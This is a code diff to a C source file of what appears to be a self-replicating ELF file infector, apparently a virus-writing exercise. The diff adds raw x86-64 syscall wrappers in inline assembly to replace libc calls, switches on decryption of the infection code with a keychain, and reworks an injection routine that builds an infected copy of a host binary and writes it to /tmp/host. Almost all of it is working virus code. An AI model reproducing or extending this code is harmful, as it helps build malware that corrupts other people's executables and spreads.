@@ -1,10 +1,139 @@
 #include <war.h>
 
 ////////////////////////////////////////////////////////////////////////////////
+/// ASM VOLATILE 
+////////////////////////////////////////////////////////////////////////////////
+
+__attribute__((always_inline)) static inline void *_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset)
+{
+	void *ret;
+
+	asm volatile
+	(
+		"mov rdi, %0\n"
+		"mov rsi, %1\n"
+		"mov edx, %2\n"
+		"mov r10d, %3\n"
+		"mov r8d, %4\n"
+		"mov r9, %5\n"
+
+		"mov rax, 0x9\n"
+		"syscall\n"
+		:
+		: "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(fd), "g"(offset)
+		);
+	asm volatile
+	(
+		"mov %0, rax\n"
+		: "=r"(ret)
+		:
+	);
+
+	return ret;
+}
+
+__attribute__((always_inline)) static inline int _open(const char *filename, int flags, mode_t mode)
+{
+	int ret;
+
+	asm volatile
+	(
+		"mov rdi, %0\n"
+		"mov esi, %1\n"
+		"mov edx, %2\n"
+
+		"mov rax, 0x2\n"
+		"syscall\n"
+		:
+		: "g"(filename), "g"(flags), "g"(mode)
+	);
+	asm volatile
+	(
+		"mov %0, eax\n"
+		: "=r"(ret)
+		:
+	);
+
+	return ret;
+}
+
+__attribute__((always_inline)) static inline ssize_t _write(int fd, const void *buf, size_t count)
+{
+	ssize_t ret;
+
+	asm volatile
+	(
+		"mov edi, %0\n"
+		"mov rsi, %1\n"
+		"mov rdx, %2\n"
+
+		"mov rax, 0x1\n"
+		"syscall\n"
+		:
+		: "g"(fd), "g"(buf), "g"(count)
+	);
+	asm volatile
+	(
+		"mov %0, rax\n"
+		: "=r"(ret)
+		:
+	);
+
+	return ret;
+}
+
+__attribute__((always_inline)) static inline int _close(int fd)
+{
+	int ret;
+
+	asm volatile
+	(
+		"mov edi, %0\n"
+
+		"mov rax, 0x3\n"
+		"syscall\n"
+		:
+		: "g"(fd)
+	);
+	asm volatile
+	(
+		"mov %0, eax\n"
+		: "=r"(ret)
+		:
+	);
+
+	return ret;
+}
+
+__attribute__((always_inline)) static inline int _munmap(void *addr, size_t length)
+{
+	int ret = 0;
+
+	asm volatile
+	(
+		"mov rdi, %0\n"
+		"mov rsi, %1\n"
+
+		"mov rax, 0xb\n"
+		"syscall\n"
+		:
+		: "g"(addr), "g"(length)
+	);
+	asm volatile
+	(
+		"mov %0, eax\n"
+		: "=r"(ret)
+		:
+	);
+
+	return ret;
+}
+
+////////////////////////////////////////////////////////////////////////////////
 /// STATIC FUNCTIONS
 ////////////////////////////////////////////////////////////////////////////////
 
-static void write_on_memory(const struct s_host *host, char *ptr, const size_t payload_size)
+__attribute__((always_inline)) static inline void write_on_memory(const struct s_host *host, char *ptr, const size_t payload_size)
 {
 	char *dst = ptr;
 	char *src = (char *)host->header;
@@ -20,7 +149,7 @@ static void write_on_memory(const struct s_host *host, char *ptr, const size_t p
 }
 
 
-static void replicate_on_memory(const struct s_host *host, char *ptr)
+__attribute__((always_inline)) static inline void replicate_on_memory(const struct s_host *host, char *ptr)
 {
 	const uint8_t buffer[29] =
 	{
@@ -36,9 +165,13 @@ static void replicate_on_memory(const struct s_host *host, char *ptr)
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void injection(struct s_host *host, struct s_keychain *keychain)
+void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
-//	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+	decrypt_left(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+
+	printf("%s\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
+	if (context == FAILURE)
+		goto label;
 
 	char *ptr;
 	int fd = 0;
@@ -46,22 +179,25 @@ void injection(struct s_host *host, struct s_keychain *keychain)
 	const size_t payload_size = PAYLOAD_SIZE + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));
 	const size_t filesize = host->filesize + payload_size;
 
-	if ((ptr = mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
-		goto label_error;
+	if ((ptr = _mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
+	{
+		context = FAILURE;
+		goto label;
+	}
 
 	write_on_memory(host, ptr, payload_size);
 	replicate_on_memory(host, ptr);
 
-	if ((fd = open("/tmp/host", O_RDWR | O_TRUNC)) < 0)
-		goto label_error;
+	if ((fd = _open("/tmp/host", O_RDWR | O_TRUNC, 0000)) < 0)
+	{
+		context = FAILURE;
+		goto label;
+	}
 
-	write(fd, ptr, filesize);
-	close(fd);
-	munmap(ptr, filesize);
+	_write(fd, ptr, filesize);
+	_close(fd);
+	_munmap(ptr, filesize);
 
-	__exit(host, keychain);
-
-label_error:
-	printf("error\n");
-	exit(1);
+label:
+	__exit(host, keychain, context);
 }
